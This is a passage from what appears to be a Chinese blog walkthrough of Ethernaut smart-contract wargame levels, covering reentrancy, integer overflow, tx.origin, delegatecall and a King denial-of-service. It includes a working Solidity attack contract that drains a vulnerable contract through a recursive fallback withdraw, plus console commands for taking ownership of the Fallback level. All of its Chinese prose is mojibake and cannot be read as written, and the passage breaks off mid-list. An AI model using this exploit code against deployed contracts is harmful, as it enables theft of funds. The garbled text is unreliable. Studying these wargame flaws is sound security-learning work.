<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.18;</span><br><span class="line"></span><br><span class="line">contract Reentrance &#123;</span><br><span class="line"></span><br><span class="line">  mapping(address =&gt; uint) public balances;</span><br><span class="line"></span><br><span class="line">  function donate(address _to) public payable &#123;</span><br><span class="line">    balances[_to] += msg.value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function balanceOf(address _who) public view returns (uint balance) &#123;</span><br><span class="line">    return balances[_who];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function withdraw(uint _amount) public &#123;</span><br><span class="line">    if(balances[msg.sender] &gt;= _amount) &#123;</span><br><span class="line">      if(msg.sender.call.value(_amount)()) &#123;</span><br><span class="line">        _amount;</span><br><span class="line">      &#125;</span><br><span class="line">      balances[msg.sender] -= _amount;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function() public payable &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line"></span><br><span class="line">    address instance_address = 0x476a5eebd3587e89d1f4f81b1fa7a724f834a04c;</span><br><span class="line">    Reentrance target = Reentrance(instance_address);</span><br><span class="line"></span><br><span class="line">    function Attack() payable&#123;&#125;</span><br><span class="line"></span><br><span class="line">    function donate() public payable &#123;</span><br><span class="line">        target.donate.value(msg.value)(this);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function hack() public &#123;</span><br><span class="line">        target.withdraw(0.5 ether);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function get_balance() public view returns(uint) &#123;</span><br><span class="line">        return target.balanceOf(this);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function my_eth_bal() public view returns(uint) &#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function ins_eth_bal() public view returns(uint) &#123;</span><br><span class="line">        return instance_address.balance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function () public payable &#123;</span><br><span class="line">        target.withdraw(0.5 ether);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æŠŠä»¥ä¸Šä»£ç æ‹·è´åˆ°remix ideä¸­ï¼Œç¼–è¯‘ä¹‹åå°†åˆçº¦éƒ¨ç½²åˆ°ç½‘ç»œä¸Šï¼Œæ­¤æ—¶æŸ¥çœ‹ï¼Œå¯ä»¥çœ‹åˆ°</p>
<ul>
<li>balance ä¸º 0</li>
<li><code>Reentrance</code> è´¦æˆ·ä½™é¢ 1 ether</li>
<li><code>Attack</code> è´¦æˆ·ä½™é¢ 0 ether</li>
</ul>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233095.jpg" alt="img"></p>
<p>ç„¶åè°ƒç”¨donateå‡½æ•°ï¼Œä»¥æ”»å‡»è€…åˆçº¦çš„èº«ä»½å‘é¢˜ç›®åœ°å€è½¬è´¦ 1 etherï¼›é¦–å…ˆåœ¨valueå¤„å¡«å†™1 etherï¼›</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233096.jpg" alt="img"></p>
<p>ç„¶åè°ƒç”¨donateå‡½æ•°ï¼š</p>
<ul>
<li>balance ä¸º 1</li>
<li><code>Reentrance</code> è´¦æˆ·ä½™é¢ 2 ether</li>
<li><code>Attack</code> è´¦æˆ·ä½™é¢ 0 ether</li>
</ul>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233097.jpg" alt="img"></p>
<p>ç„¶åå¼€å§‹æ”»å‡»ï¼Œè°ƒç”¨hack():</p>
<p>æ•ˆæœå¦‚ä¸‹ï¼š</p>
<ul>
<li>balance ä¸‹æº¢</li>
<li>Reentrance è´¦æˆ·ä½™é¢ 0 ether</li>
<li>Attack è´¦æˆ·ä½™é¢ 2 ether</li>
</ul>
<p>ä¸€èˆ¬æ¥è¯´ï¼Œåœ¨è°ƒç”¨hackçš„æ—¶å€™ä¼šæŠ¥å‡ºä¸èƒ½æ­£ç¡®ä¼°è®¡gasçš„é—®é¢˜ï¼Œå°½é‡å¤šç»™å®ƒä¸€äº›gasã€‚</p>
<p>å¦‚æœgasä¸è¶³ï¼Œä¼šæŠ¥é”™ã€‚å¥‡æ€ªçš„æ˜¯ï¼Œå±…ç„¶å‡ºç°äº†è¿™ç§çŠ¶å†µï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233098.jpg" alt="img"></p>
<p>å¦‚æœhackæ­£å¸¸å·¥ä½œï¼Œé‚£ä¹ˆç»“æœå¦‚ä¸‹ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233099.jpg" alt="img"></p>
<p>\2. ä¸ºäº†å·©å›ºå¯¹ä¸Šä¸€ä¸ªæ¼æ´çš„ç†è§£ï¼Œæˆ‘ä»¬æ¥æ¥ç€çœ‹ç¬¬ä¸€å…³ï¼ŒFallbackã€‚</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.18;</span><br><span class="line"></span><br><span class="line">import &#x27;zeppelin-solidity/contracts/ownership/Ownable.sol&#x27;;</span><br><span class="line"></span><br><span class="line">contract Fallback is Ownable &#123;</span><br><span class="line"></span><br><span class="line">  mapping(address =&gt; uint) public contributions;</span><br><span class="line"></span><br><span class="line">  function Fallback() public &#123;</span><br><span class="line">    contributions[msg.sender] = 1000 * (1 ether);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function contribute() public payable &#123;</span><br><span class="line">    require(msg.value &lt; 0.001 ether);</span><br><span class="line">    contributions[msg.sender] += msg.value;</span><br><span class="line">    if(contributions[msg.sender] &gt; contributions[owner]) &#123;</span><br><span class="line">      owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function getContribution() public view returns (uint) &#123;</span><br><span class="line">    return contributions[msg.sender];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function withdraw() public onlyOwner &#123;</span><br><span class="line">    owner.transfer(this.balance);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function() payable public &#123;</span><br><span class="line">    require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸€å…³ä¸­ï¼Œç›´æ¥ç»™å‡ºäº†æºç ï¼Œç„¶åè¦æ±‚çš„é€šå…³æ¡ä»¶æ˜¯</p>
<ul>
<li>æˆä¸ºåˆçº¦çš„ owner</li>
<li>æ¸…é›¶ balance</li>
</ul>
<p>åˆçº¦æ„é€ å‡½æ•° <code>Fallback()</code> ä¸­åˆå§‹åŒ–æ‹¥æœ‰è€…è´¡çŒ®åº¦ä¸º 1000 etherã€‚<br>æˆ‘ä»¬å¯ä»¥é€šè¿‡è½¬é’±æå‡è´¡çŒ®åº¦ï¼Œå½“è´¡çŒ®åº¦è¶…è¿‡ 1000 ether å³å¯æˆä¸ºåˆçº¦ ownerã€‚<br>ä½†åœ¨ <code>contribute()</code> ä¸­é™åˆ¶äº†æ¯æ¬¡åªèƒ½è½¬å°äº 0.001 ether çš„é’±ã€‚å¾ˆæ˜æ˜¾ï¼Œæ­¤è·¯ä¸é€šã€‚</p>
<p>é‚£è¯·é—®åº”è¯¥å¦‚ä½•é€šå…³å‘¢ï¼Ÿ</p>
<p>ç„¶è€Œæˆä¸º owner è¿˜æœ‰å¦ä¸€ç§æ–¹å¼ï¼Œæ³¨æ„åˆ°åˆçº¦çš„ fallback å‡½æ•°ï¼Œå³æœ€ä¸‹çš„æ— åå‡½æ•°ã€‚å½“åˆçº¦è´¦æˆ·æ”¶åˆ°ä¸€ç¬”è½¬è´¦æ—¶ä¼šè‡ªåŠ¨è°ƒç”¨ fallback å‡½æ•°ã€‚åœ¨è¿™é‡Œï¼Œåªè¦è½¬è´¦é‡‘é¢å¤§äº0ï¼Œå¹¶ä¸”è´¡çŒ®å¤§äº0ï¼Œå³å¯æˆä¸º ownerã€‚</p>
<p>è°ƒç”¨ <code>help()</code> å‡½æ•°ï¼Œäº†è§£ä¸‹å¦‚ä½•è¿›è¡Œè½¬é’±æ“ä½œã€‚è¿˜éœ€è¦æ³¨æ„ä¸€ä¸‹ Wei å’Œ Ether çš„è½¬æ¢ã€‚</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">contract.contribute(&#123;value: 1&#125;)</span><br><span class="line">contract.sendTransaction(&#123;value: 1&#125;)</span><br><span class="line">contract.withdraw()</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œæœ‰å¦ä¸€ä¸ªé—®é¢˜ï¼Œå¦‚ä½•è°ƒç”¨fallbackã€‚å¯ä»¥ä½¿ç”¨instance.sendTransaction({})çš„æ–¹æ³•æ¥è§¦å‘fallbackå‡½æ•°ã€‚</p>
<p>\3. è¿™é‡Œç»§ç»­åŠ æ·±å¯¹ç¬¬ä¸€ä¸ªé‡å…¥é—®é¢˜çš„ç†è§£ï¼Œåœ¨æœ€åä¸€æ­¥hackæˆåŠŸä¹‹åï¼Œè‡ªå·±è´¦æˆ·ä½™é¢æ˜¯ä¸€ä¸ªå¾ˆå¤§çš„æ•°å€¼ã€‚è¿™æ˜¯æ€ä¹ˆå›äº‹å‘¢ï¼Ÿ</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">2**256   = 115792089237316195423570985008687907853269984665640564039457584007913129639936L</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œå°±æ¶‰åŠåˆ°æ•´æ•°çš„ä¸Šæº¢å’Œä¸‹æº¢ã€‚</p>
<p>ä»¥å¤ªåŠè™šæ‹Ÿæœºï¼ˆEVMï¼‰ä¸ºæ•´æ•°æŒ‡å®šå›ºå®šå¤§å°çš„æ•°æ®ç±»å‹ã€‚è¿™æ„å‘³ç€ä¸€ä¸ªæ•´å½¢å˜é‡åªèƒ½è¡¨è¾¾ä¸€å®šèŒƒå›´çš„æ•°å­—ã€‚ä¾‹å¦‚ï¼Œuint8ï¼Œåªèƒ½å­˜å‚¨[0,255]ä¹‹é—´çš„æ•°å­—ï¼Œå¦‚æœæƒ³å­˜å‚¨256ï¼Œé‚£ä¹ˆå°±ä¼šä¸Šæº¢ï¼Œä»è€Œå°†å˜é‡çš„å€¼å˜ä¸º0ã€‚ç›¸å¯¹åº”çš„ï¼Œå¦‚æœä»ä¸€ä¸ªuint8ç±»å‹çš„å€¼ä¸º0çš„å˜é‡ä¸­å‡1ï¼Œå°±ä¼šå‘ç”Ÿä¸‹æº¢ï¼Œè¯¥å˜é‡ä¼šå˜æˆ255ã€‚å¦‚æœä¸åŠ æ³¨æ„ï¼Œè€Œä¸”æœ‰æ²¡æœ‰å¯¹ç”¨æˆ·è¾“å…¥æ‰§è¡Œæ£€æŸ¥ï¼Œå°±æœ‰å¯èƒ½å‘ç”Ÿæ”»å‡»ã€‚</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">contract TimeLock &#123;</span><br><span class="line"></span><br><span class="line">    mapping(address =&gt; uint) public balances;</span><br><span class="line">    mapping(address =&gt; uint) public lockTime;</span><br><span class="line"></span><br><span class="line">    function deposit() public payable &#123;</span><br><span class="line">        balances[msg.sender] += msg.value;</span><br><span class="line">        lockTime[msg.sender] = now + 1 weeks;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function increaseLockTime(uint _secondsToIncrease) public &#123;</span><br><span class="line">        lockTime[msg.sender] += _secondsToIncrease;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw() public &#123;</span><br><span class="line">        require(balances[msg.sender] &gt; 0);</span><br><span class="line">        require(now &gt; lockTime[msg.sender]);</span><br><span class="line">        balances[msg.sender] = 0;</span><br><span class="line">        msg.sender.transfer(balances[msg.sender]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™ä»½åˆçº¦çš„è®¾è®¡å°±åƒæ˜¯ä¸€ä¸ªæ—¶é—´ä¿é™©åº“ï¼Œç”¨æˆ·å¯ä»¥å°† Ether å­˜å…¥åˆçº¦ï¼Œå¹¶åœ¨é‚£é‡Œé”å®šè‡³å°‘ä¸€å‘¨ã€‚è€Œä¸”é€šè¿‡ä½¿ç”¨increaseLockTimeå‡½æ•°ï¼Œç”¨æˆ·å¯ä»¥å»¶é•¿è¶…è¿‡1å‘¨çš„æ—¶é—´ï¼Œä½†æ˜¯ä¸€æ—¦å­˜æ”¾ï¼Œç”¨æˆ·å¯ä»¥ç¡®ä¿¡ä»–ä»¬çš„ Ether ä¼šè¢«å®‰å…¨é”å®šè‡³å°‘ä¸€å‘¨ã€‚</p>
<p>ä¸Šè¿°ä»£ç æœ‰ä»€ä¹ˆé—®é¢˜å‘¢ï¼Ÿï¼ˆlockTimeçš„æ—¶é—´æ˜¯uintç±»å‹ï¼‰</p>
<p>é‚£æˆ‘ä»¬æ¥çœ‹ethernautçš„ç¬¬5å…³ã€‚</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.18;</span><br><span class="line"></span><br><span class="line">contract Token &#123;</span><br><span class="line"></span><br><span class="line">  mapping(address =&gt; uint) balances;</span><br><span class="line">  uint public totalSupply;</span><br><span class="line"></span><br><span class="line">  function Token(uint _initialSupply) &#123;</span><br><span class="line">    balances[msg.sender] = totalSupply = _initialSupply;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function transfer(address _to, uint _value) public returns (bool) &#123;</span><br><span class="line">    require(balances[msg.sender] - _value &gt;= 0);</span><br><span class="line">    balances[msg.sender] -= _value;</span><br><span class="line">    balances[_to] += _value;</span><br><span class="line">    return true;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function balanceOf(address _owner) public constant returns (uint balance) &#123;</span><br><span class="line">    return balances[_owner];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åŒæ ·çš„ï¼Œå¯ä»¥åˆ©ç”¨æº¢å‡ºã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233100.jpg" alt="img"></p>
<p>\4. çœ‹å®Œå‰é¢å‡ ä¸ªé—®é¢˜ä¹‹åï¼Œç»§ç»­çœ‹ä¸€ä¸‹å…¶ä»–æ–¹é¢çš„é—®é¢˜ã€‚</p>
<p>ç¬¬å››å…³telephoneã€‚</p>
<p><code>tx.origin</code>æ˜¯ä¸€ä¸ªaddressç±»å‹ï¼Œè¡¨ç¤ºäº¤æ˜“çš„å‘é€è€…ï¼Œ<code>msg.sender</code>åˆ™è¡¨ç¤ºä¸ºæ¶ˆæ¯çš„å‘é€è€…ã€‚åœ¨åŒä¸€ä¸ªåˆçº¦ä¸­ï¼Œå®ƒä»¬æ˜¯ç­‰ä»·çš„ã€‚</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.18;</span><br><span class="line">contract Demo &#123;</span><br><span class="line">    event logData(address);</span><br><span class="line">    </span><br><span class="line">    function a()&#123;</span><br><span class="line">        logData(tx.origin);</span><br><span class="line">        logData(msg.sender);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233101.jpg" alt="img"></p>
<p>ä½†æ˜¯åœ¨ä¸åŒåˆçº¦ä¸­ï¼Œ<code>tx.origin</code>è¡¨ç¤ºç”¨æˆ·åœ°å€ï¼Œ<code>msg.sender</code>åˆ™è¡¨ç¤ºåˆçº¦åœ°å€ã€‚</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.18;</span><br><span class="line">contract Demo &#123;</span><br><span class="line">    event logData(address);</span><br><span class="line">    </span><br><span class="line">    function a()&#123;</span><br><span class="line">        logData(tx.origin);</span><br><span class="line">        logData(msg.sender);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">contract Demo2&#123;</span><br><span class="line">    Demo demo222;</span><br><span class="line">    function Demo2(address aimAddr) &#123;</span><br><span class="line">        demo222 = Demo(aimAddr);</span><br><span class="line">    &#125;</span><br><span class="line">    function exp()&#123;</span><br><span class="line">        demo222.a();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233102.jpg" alt="img"></p>
<p>è¿™é‡Œçš„0x2b9â€¦.69aeå°±æ˜¯åˆçº¦éƒ¨ç½²ä¹‹åçš„åœ°å€ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233103.jpg" alt="img"></p>
<p>\5. Access Control è®¿é—®æ§åˆ¶</p>
<p>è®¿é—®æ§åˆ¶ï¼Œåœ¨ä½¿ç”¨ Solidity ç¼–å†™åˆçº¦ä»£ç æ—¶ï¼Œæœ‰å‡ ç§é»˜è®¤çš„å˜é‡æˆ–å‡½æ•°è®¿é—®åŸŸå…³é”®å­—ï¼šprivate, public, external å’Œ internalï¼Œå¯¹åˆçº¦å®ä¾‹æ–¹æ³•æ¥è®²ï¼Œé»˜è®¤å¯è§çŠ¶æ€ä¸º publicï¼Œè€Œåˆçº¦å®ä¾‹å˜é‡çš„é»˜è®¤å¯è§çŠ¶æ€ä¸º privateã€‚</p>
<ul>
<li>public æ ‡è®°å‡½æ•°æˆ–å˜é‡å¯ä»¥è¢«ä»»ä½•è´¦æˆ·è°ƒç”¨æˆ–è·å–ï¼Œå¯ä»¥æ˜¯åˆçº¦é‡Œçš„å‡½æ•°ã€å¤–éƒ¨ç”¨æˆ·æˆ–ç»§æ‰¿è¯¥åˆçº¦é‡Œçš„å‡½æ•°</li>
<li>external æ ‡è®°çš„å‡½æ•°åªèƒ½ä»å¤–éƒ¨è®¿é—®ï¼Œä¸èƒ½è¢«åˆçº¦é‡Œçš„å‡½æ•°ç›´æ¥è°ƒç”¨ï¼Œä½†å¯ä»¥ä½¿ç”¨ this.func() å¤–éƒ¨è°ƒç”¨çš„æ–¹å¼è°ƒç”¨è¯¥å‡½æ•°</li>
<li>private æ ‡è®°çš„å‡½æ•°æˆ–å˜é‡åªèƒ½åœ¨æœ¬åˆçº¦ä¸­ä½¿ç”¨ï¼ˆæ³¨ï¼šè¿™é‡Œçš„é™åˆ¶åªæ˜¯åœ¨ä»£ç å±‚é¢ï¼Œä»¥å¤ªåŠæ˜¯å…¬é“¾ï¼Œä»»ä½•äººéƒ½èƒ½ç›´æ¥ä»é“¾ä¸Šè·å–åˆçº¦çš„çŠ¶æ€ä¿¡æ¯ï¼‰</li>
<li>internal ä¸€èˆ¬ç”¨åœ¨åˆçº¦ç»§æ‰¿ä¸­ï¼Œçˆ¶åˆçº¦ä¸­è¢«æ ‡è®°æˆ internal çŠ¶æ€å˜é‡æˆ–å‡½æ•°å¯ä¾›å­åˆçº¦è¿›è¡Œç›´æ¥è®¿é—®å’Œè°ƒç”¨ï¼ˆå¤–éƒ¨æ— æ³•ç›´æ¥è·å–å’Œè°ƒç”¨ï¼‰</li>
</ul>
<p>Solidity ä¸­é™¤äº†å¸¸è§„çš„å˜é‡å’Œå‡½æ•°å¯è§æ€§æè¿°å¤–ï¼Œè¿™é‡Œè¿˜éœ€è¦ç‰¹åˆ«æåˆ°çš„å°±æ˜¯ä¸¤ç§åº•å±‚è°ƒç”¨æ–¹å¼ <code>call</code>å’Œ <code>delegatecall</code>ï¼š</p>
<ul>
<li><code>call</code> çš„å¤–éƒ¨è°ƒç”¨ä¸Šä¸‹æ–‡æ˜¯å¤–éƒ¨åˆçº¦</li>
<li><code>delegatecall</code> çš„å¤–éƒ¨è°ƒç”¨ä¸Šä¸‹æ–‡æ˜¯è°ƒç”¨åˆçº¦ä¸Šä¸‹æ–‡</li>
</ul>
<p>DELEGATECALLåŸºæœ¬å°±æ˜¯è¯´â€œæˆ‘æ˜¯ä¸€ä¸ªåˆçº¦ï¼Œæˆ‘æˆæƒï¼ˆdelegatingï¼‰ä½ å¯¹æˆ‘çš„storageåšä»»ä½•äº‹æƒ…â€ã€‚delegatecallçš„å®‰å…¨é—®é¢˜æ˜¯å®ƒå¿…é¡»è¦èƒ½å¤Ÿä¿¡ä»»æ¥æ”¶æ–¹çš„åˆçº¦ä¼šå–„å¾…å®ƒçš„storageã€‚DELEGATECALLæ˜¯å¯¹CALLCODEçš„æ”¹è¿›ï¼Œå› ä¸ºCALLCODEä¸ä¿å­˜msg.sendå’Œmsg.valueã€‚è­¬å¦‚å¦‚æœAè°ƒç”¨Bï¼ŒBåˆDELEGATECALLç»™Cï¼Œé‚£ä¹ˆåœ¨DELEGATECALLä¸­çš„msg.senderæ˜¯Aï¼Œè€Œåœ¨CALLCODEä¸­çš„msg.senderæ˜¯Bã€‚</p>
<p>å¦‚æœAä½¿ç”¨CALLè°ƒç”¨Bï¼Œé‚£ä¹ˆBçš„ä»£ç çš„è¿è¡Œä¸Šä¸‹æ–‡å°±æ˜¯Bï¼›å¦‚æœAä½¿ç”¨DELEGATECALLè°ƒç”¨Bï¼Œé‚£ä¹ˆBçš„ä»£ç çš„è¿è¡Œä¸Šä¸‹æ–‡æ˜¯Açš„ä¸Šä¸‹æ–‡ã€‚ç®€å•çš„ç”¨å›¾è¡¨ç¤ºå°±æ˜¯ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233104.jpg" alt="img"></p>
<p>æœ‰äº†è¿™äº›èƒŒæ™¯çŸ¥è¯†ï¼Œæˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹Ethernautä¸­çš„é¢˜ç›®ï¼Œç¬¬å…­å…³delegationã€‚è¿‡å…³è¦æ±‚æ˜¯è¦æˆä¸ºåˆçº¦å®ä¾‹çš„ownerã€‚</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.10;</span><br><span class="line"></span><br><span class="line">contract Delegate &#123;</span><br><span class="line">    address public owner;</span><br><span class="line"></span><br><span class="line">    function Delegate(address _owner) &#123;</span><br><span class="line">        owner = _owner;</span><br><span class="line">    &#125;</span><br><span class="line">    function pwn() &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Delegation &#123;</span><br><span class="line">    address public owner;</span><br><span class="line">    Delegate delegate;</span><br><span class="line"></span><br><span class="line">    function Delegation(address _delegateAddress) &#123;</span><br><span class="line">        delegate = Delegate(_delegateAddress);</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">    function () &#123;</span><br><span class="line">        if (delegate.delegatecall(msg.data)) &#123;</span><br><span class="line">            this;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ€è·¯å…¶å®æ˜¯å¾ˆæ¸…æ™°ï¼Œå› ä¸º<code>Delegation</code>åˆçº¦ä¸­çš„<code>delegatecall</code>å‡½æ•°å‚æ•°å¯æ§ï¼Œå¯¼è‡´å¯ä»¥åœ¨åˆçº¦å†…éƒ¨æ‰§è¡Œä»»æ„å‡½æ•°ï¼Œåªéœ€è°ƒç”¨<code>Delegate</code>åˆçº¦ä¸­çš„<code>pwn</code>å‡½æ•°ï¼Œå³å¯å°† owner å˜æˆè‡ªå·±ã€‚è¿™é‡Œéœ€è¦æ³¨æ„çš„é—®é¢˜æ˜¯ï¼Œdelegatecallçš„å‚æ•°é—®é¢˜ã€‚ä¸æ˜¯ç›´æ¥æŠŠå‡½æ•°åå­—ä¼ é€’è¿‡å»ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233105.jpg" alt="img"></p>
<p>åŸå› æ˜¯ï¼Œè¿™é‡Œéœ€è¦çŸ¥é“**Ethereum Virtual Machine(EVM)**å¦‚ä½•ç¡®å®šæ‰§è¡Œåˆçº¦çš„å“ªä¸ªå‡½æ•°ã€‚åˆçº¦æœ€åéƒ½ä¼šè¢«ç¼–è¯‘æˆbytecodeï¼Œè€Œå‘èµ·ä¸€ä¸ªtransactionè¦æ‰§è¡Œåˆçº¦é‡Œçš„æŸä¸ªå‡½æ•°æ—¶ï¼Œäº¤æ˜“é‡Œçš„dataå­—æ®µåŒæ ·ä¹Ÿæ˜¯bytecodeè€Œä¸æ˜¯äººçœ‹å¾—æ‡‚çš„å‡½æ•°åç§°ã€‚ ä»¥ä¸€ä¸ªç®€å•çš„åˆçº¦ä¸ºä¾‹ï¼š</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">contract Multiply &#123;</span><br><span class="line"></span><br><span class="line">   function multiply(int x, int y) constant returns(int) &#123;</span><br><span class="line"></span><br><span class="line">       return x*y; </span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç¼–è¯‘å®Œçš„bytecodeï¼š</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">6060604052341561000c57fe5b5b60ae8061001b6000396000f30060606040526000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff1680633c4308a814603a575bfe5b3415604157fe5b605e60048080359060200190919080359060200190919050506074565b6040518082815260200191505060405180910390f35b600081830290505b929150505600a165627a7a72305820c40f61d36a3a1b7064b58c57c89d5c3d7c73b9116230f9948806b11836d2960c0029</span><br></pre></td></tr></table></figure>

<p>å¦‚æœè¦æ‰§è¡Œmultiplyå‡½æ•°ï¼Œç®—å‡º8*7ç­‰äºå¤šå°‘ï¼Œtransactioné‡Œçš„dataå­—æ®µä¼šæ˜¯</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">0x3c4308a800000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000007</span><br></pre></td></tr></table></figure>

<p>åˆ†æˆä¸‰ä¸ªéƒ¨åˆ†ï¼š ç¬¬ä¸€ä¸ªæ˜¯å››ä¸ªbyteçš„3c4308a8ï¼Œç¬¬äºŒå’Œç¬¬ä¸‰ä¸ªåˆ†åˆ«æ˜¯32 byteé•¿çš„å‚æ•°ï¼Œ8å’Œ7ã€‚</p>
<p><strong>3c4308a8</strong>æ˜¯multiplyå‡½å¼çš„ <strong>signature</strong>ï¼Œæ˜¯å–å‡½æ•°åç§°å’Œå‚æ•°ç±»å‹è¿›è¡Œå“ˆå¸Œåå–å‰å››ä¸ªbyteè€Œå¾—ï¼ˆä¸åŒ…å« <code>0x</code> ï¼‰ï¼š</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">sha3(&quot;multiply(int256,int256)&quot;));</span><br><span class="line">//0x3c4308a8851ef99b4bfa5ffd64b68e5f2b4307725b25ad0d14040bdb81e3bafcsha3(&quot;multiply(int256,int256)&quot;)).substr(2,8);</span><br><span class="line">//3c4308a8</span><br></pre></td></tr></table></figure>

<p>EVMå°±æ˜¯é å‡½å¼çš„signatureæ¥çŸ¥é“è¯¥æ‰§è¡Œå“ªä¸ªå‡½å¼çš„ã€‚åœ¨åˆçº¦ç¼–è¯‘å®Œçš„bytecodeé‡Œæœå¯»ä¹Ÿèƒ½æ‰¾åˆ°æ­¤signatureã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233106.jpg" alt="img"></p>
<p>\6. DoSæ‹’ç»æœåŠ¡æ”»å‡»</p>
<p>æ‹’ç»æœåŠ¡æ”»å‡»ã€‚</p>
<p>è¿™é‡Œå‚çœ‹Ethernautçš„ç¬¬ä¹å…³ï¼Œkingã€‚</p>
<p>åˆçº¦ä»£ç é€»è¾‘å¾ˆç®€å•ï¼Œè°ç»™çš„é’±å¤šè°å°±èƒ½æˆä¸º Kingï¼Œå¹¶ä¸”å°†å‰ä»» King ä»˜çš„é’±å½’è¿˜ã€‚å½“æäº¤ instance æ—¶ï¼Œé¢˜ç›®ä¼šé‡æ–°å¤ºå› King çš„ä½ç½®ï¼Œéœ€è¦è§£é¢˜è€…é˜»æ­¢å…¶ä»–äººæˆä¸º Kingã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233107.jpg" alt="img"></p>
<p>ç„¶åæäº¤ä¸€äº›å¸ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233108.jpg" alt="img"></p>
<p>å›é¡¾ä¸€ä¸‹ Solidity ä¸­å‡ ç§è½¬å¸æ–¹å¼ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;address&gt;.transfer()</span><br></pre></td></tr></table></figure>

<ul>
<li>å½“å‘é€å¤±è´¥æ—¶ä¼š <code>throw;</code> å›æ»šçŠ¶æ€</li>
<li>åªä¼šä¼ é€’éƒ¨åˆ† Gas ä¾›è°ƒç”¨ï¼Œé˜²æ­¢é‡å…¥ï¼ˆreentrancyï¼‰</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;address&gt;.send()</span><br></pre></td></tr></table></figure>

<ul>
<li>å½“å‘é€å¤±è´¥æ—¶ä¼šè¿”å› false</li>
